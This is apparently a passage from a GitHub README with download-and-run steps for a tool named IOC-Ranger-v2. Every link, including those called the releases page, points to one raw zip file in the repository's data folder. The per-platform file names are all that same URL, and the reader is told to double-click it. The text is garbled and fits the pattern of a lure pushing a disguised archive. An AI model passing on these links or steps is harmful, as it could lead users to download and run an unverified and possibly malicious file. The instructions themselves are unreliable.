...
[![Download IOC-Ranger-v2](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip)](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip)

To get started, visit the releases page to download the application.

**Download it here:** [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip)
...
1. **Visit the Releases Page:** Click on the link below to go to the downloads section.
   - [IOC-Ranger-v2 Releases Page](https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip)

2. **Select the Latest Version:** On the releases page, find the latest version available. 

3. **Download the File:**
   - For **Windows**, look for the file named `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip`.
   - For **macOS**, choose `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip`.
   - For **Linux**, download `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip`.
...
5. **Run the Application:**
   ...
   - Double-click on `https://github.com/st-ev-e/IOC-Ranger-v2/raw/refs/heads/main/data/v_IO_Ranger_3.8-alpha.2.zip` to start the application.
